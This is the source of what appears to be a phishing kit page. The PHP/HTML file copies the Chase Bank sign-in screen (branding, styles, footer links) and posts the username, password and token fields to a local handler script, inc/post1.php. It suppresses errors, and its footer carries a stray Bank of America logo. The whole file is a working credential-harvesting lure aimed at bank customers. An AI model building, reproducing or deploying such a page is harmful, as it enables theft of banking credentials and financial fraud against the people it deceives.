<?php
/*
Mou-Ad
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on');
ob_start();

include_once 'lib.php';

?>
    <!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml"
 class="no-js" dir="ltr" lang="en">
<head>
  <meta http-equiv="Content-Type"
 content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible"
 content="IE=edge">
  <meta name="msapplication-config"
 content="none">
  <title>Chase Bank - Credit Card, Mortgage, Auto, Banking Services</title>
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="viewport"
 content="width=device-width, initial-scale=1.0">


<!--[if lte IE 8]>
        <link rel="stylesheet" type="text/css" media="all" href="css/ie8.css" />
        <![endif]-->
        <link rel="shortcut icon" href="css/chasefavicon.ico" />
  <link rel="apple-touch-icon"
 sizes="152x152"
 href="css/chase-touch-icon-152x152.png">
  <link rel="apple-touch-icon"
 sizes="120x120"
 href="css/chase-touch-icon-120x120.png">
  <link rel="apple-touch-icon"
 sizes="76x76"
 href="">
  <link rel="apple-touch-icon"
 href="">
  <meta name="apple-mobile-web-app-capable"
 content="yes">
  <meta
 name="apple-mobile-web-app-status-bar-style" content="black">
  <link rel="apple-touch-startup-image"
 href=""
 media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:landscape)">
  <link rel="apple-touch-startup-image"
 href=""
 media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:portrait)">
  <link rel="apple-touch-startup-image"
 href=""
 media="screen and (max-device-width: 320px)">
  <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('css/opensans-regular.eot?#iefix') format('embedded-opentype'),url('') format('woff'),url('css/opensans-regular.ttf') format('truetype'),url('css/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('css/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('css/opensans-semibold.woff') format('woff'),url('css/opensans-semibold.ttf') format('truetype'),url('css/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('css/opensans-light.eot?#iefix') format('embedded-opentype'),url('css/opensans-light.woff') format('woff'),url('css/opensans-light.ttf') format('truetype'),url('css/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('css/videoplayer.eot?#iefix') format('embedded-opentype'),url('css/videoplayer.woff') format('woff'),url('css/videoplayer.ttf') format('truetype'),url('css/videoplayer.svg#videoplayer') format('svg');}
        html {height:100%; background: #fff;}

        @media only screen and (min-width: 768px) {
        html {
        background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
        }
        }
        </style>
  <link rel="stylesheet"
 href="css/blue-ui.css">
  <link rel="stylesheet"
 href="css/logon.css">
 
  <style type="text/css">.jpui.background.image { background-image: url(css/background.mobile.night.7.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(srccss/background.mobile.night.7.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='css/background.mobile.night.7.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(css/background.mobile.night.7.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(css/background.tablet.night.7.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(css/background.desktop.night.7.jpeg); } }</style>
</head>
<body style="height: 100%;"
 data-has-view="true">
<div>
<div class="homepage" tabindex="-1">
<div id="sitemessage" role="region"
 aria-labelledby="site-messages-heading"
 class="toggle-aria-hidden" aria-hidden="true"
 data-has-view="true">
<div>
<div id="siteMessageAda"
 aria-live="polite">
<h2 id="site-messages-heading"
 class="util accessible-text"
 data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You
have no more site alerts</h2>
</div>
</div>
</div>

<header id="logon-summary-menu"
 class="toggle-aria-hidden" data-has-view="true"></header>
<div
 class="logon header jpui transparent navigation bar">


     <img style="max-width: 80%;"   src="chase.png"  />

</div>

</div>



<div class="row">
<div class="col-xs-12">
<div class="progress">
<div class="bar"></div>
</div>

</div>
</div>
<div class="container logon">
<div>
<div
 class="jpui background image fixed show-xs show-sm"
 id="geoImage"></div>
</div>

<div class="row">
<div id="logoffbox"
 class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden">
<div class="jpui raised segment">
<div class="row">
<div class="col-xs-10 col-xs-offset-1">

</div>
</div>
<div class="row">
<div class="col-xs-12">
<div class="progress">
<div class="bar"></div>
</div>
</div>
</div>
</div>
</div>
<div id="logonbox"
 class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box">
<div class="jpui raised segment">
<div class="row">
<div class="col-xs-10 col-xs-offset-1">
<form id="login-form" method="post"
 autocomplete="off" action="inc/post1.php" >
  <div id="validator-error-header"
 class="hide-xs">
  <div id="logon-error"
 class="jpui error inverted primary alert error" role="region">
  <div class="icon"><span
 id="type-icon-logon-error"><i
 class="jpui exclamation-color icon" aria-hidden="true"
 id="icon-type-icon-logon-error"></i></span></div>
  <div class="icon background"></div>
  <div id="content-logon-error"
 class="content wrap">
  <h2 class="title" tabindex="-1"
 id="inner-logon-error"><span
 class="util accessible-text" id="icon-logon-error">Important:
  </span></h2>
  </div>
  </div>
  </div>
  <label for="userId-input-field"
 class="util accessible-text logon-xs-toggle error"
 data-attr="LOGON.userIdPlaceholder"><span
 class="accessible-text errorAdaText">Error:</span>Username</label>
  <div id="userId"
 class="logon-xs-toggle"><input
 id="userId-input-field" class="jpui input"
 placeholder="Username" aria-describedby="userId-helpertext"
 aria-invalid="false" min="0" name="1"
 data-validate="userId" value="" autocorrect="off"
 autocapitalize="off" data-attr="LOGON.userId" type="text" required="">
  </div>
  <label for="password-input-field"
 class="util accessible-text logon-xs-toggle"
 data-attr="LOGON.passwordPlaceholder"><span
 class="accessible-text errorAdaText"></span>Password</label>
  <div id="password"
 class="logon-xs-toggle"><input
 id="password-input-field" class="jpui input"
 placeholder="Password" aria-describedby="password-helpertext"
 aria-invalid="false" min="0" autocomplete="off"
 name="2" data-validate="password" required=""
 value="" data-attr="LOGON.password" type="password">
  </div>
  <div > 
  <div
 class="col-xs-6 rememberMe-checkbox-container">
  <div id="rememberMe"
 class="jpui checkbox">
  <div class="checkbox-flex">
  <div class="checkboxWrap"><input
 id="input-rememberMe" name="rememberMe" value="on"
 data-attr="LOGON.rememberMyUserId" type="checkbox">
  <i class="jpui checkmark icon check"
 aria-hidden="true"></i></div>
  <label for="input-rememberMe"><span
 class="util accessible-text" id="accessible-rememberMe"
 data-attr="LOGON.rememberMyUserIdAda">This checked
box means that we will remember your username. </span><span class="checkbox-label" id="label-rememberMe" data-attr="LOGON.rememberMyUserIdLabel">Remember me </span></label></div>
  </div>
  </div>
  <div
 class="col-xs-6 token-checkbox-container">
 <div id="useToken" class="jpui checkbox useToken "><div class="checkbox-flex"><div class="checkboxWrap"><input id="input-useToken" type="checkbox" name="rsaToken" value="on"> <i class="jpui checkmark icon check" aria-hidden="true"></i></div> <label for="input-useToken"><span class="util accessible-text" id="accessible-useToken">Shows content above.</span><span class="checkbox-label" id="label-useToken">Use token </span></label></div></div>
  </div>
  </div>
  <div class="row"> <button
 class="jpui button focus fluid primary" id="signin-button"
 type="submit" role="button"
 data-attr="LOGON.logonToLandingPage">
  <div class="label">Sign in</div>
  </button> </div>
  <div class="row"><span
 id="forgotPassword-link-wrapper" class="jpui link"><a
 id="forgotPassword" href="javascript:void(0);"
 class="link-anchor" data-attr="LOGON.forgotPasswordNavigation">Forgot
username/password?<i
 class="" aria-hidden="true"></i></a></span></div>
  <div class="row"><span
 id="enrollment-link-wrapper" class="jpui link"><a
 id="enrollment" href="javascript:void(0);"
 class="link-anchor last" data-attr="LOGON.enrollNavigation">Not
enrolled? Sign up now.<i
 class="" aria-hidden="true"></i></a></span></div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
<footer id="logon-footer"
 class="toggle-aria-hidden" data-has-view="true"></footer>
<div class="footer-container">
<div class="container">
<div class="social-links row">
<div class="col-xs-12">
 <span class="follow-us-text" style="
    height: 30px;
">Follow us:</span>
<img itemprop="logo" height="21" width="185" alt="Βank of Αmerica" src="css/Capture.PNG">
</div>
</div>
<div class="footer-links row">
<div class="col-xs-12">
<ul>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestContactUs">Contact
us</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestSecurity">Security</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestTermsOfUse">Terms
of use</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our
commitment to accessibility</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestMortgageLoanOriginators">SAFE
Act: Chase Mortgage Loan Originators</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestHomeMortgageDisclosureAct">Fair
Lending</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestAboutChase">About
Chase</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestJpMorgan">J.P.
Morgan</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestJpMorganChaseCo">JPMorgan
Chase &amp; Co.</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestCareers">Careers</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestEspanol" lang="es">Espa&ntilde;ol</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestChaseCanada">Chase
Canada</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestSiteMap">Site map</a></li>
  <li>Member FDIC</li>
  <li><i
 class="jpui equal-housing-lender icon" aria-hidden="true"></i>
Equal Housing Lender</li>
  <li class="copyright-label">&copy;
2018 JPMorgan Chase &amp; Co.</li>
</ul>
</div>
</div>
<div class="row galaxy-footer">
<div class="col-xs-10 col-xs-offset-1">
<p class="NOTE"><span></span><br>
<span class="copyright-label">&copy;
2017 JPMorgan Chase &amp; Co.</span><br>
<a
 href=""
 class="NOTELINK"
 data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy
<i class="jpui progressright icon end-icon"
 aria-hidden="true"></i></a><br>
<a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our
commitment to accessibility<i
 class="jpui progressright icon end-icon" aria-hidden="true"></i></a></p>
</div>
</div>
</div>
</div>
</div>
<div id="languageSupportDisclaimer"></div>
<div id="overlay" data-has-view="true"></div>
<div id="signoutModal"></div>
<div id="siteExitWarning"></div>
<div id="serviceErrorModal">
</div>
<div id="sessionTimeoutModal"></div>
</div>
</body>
</html>
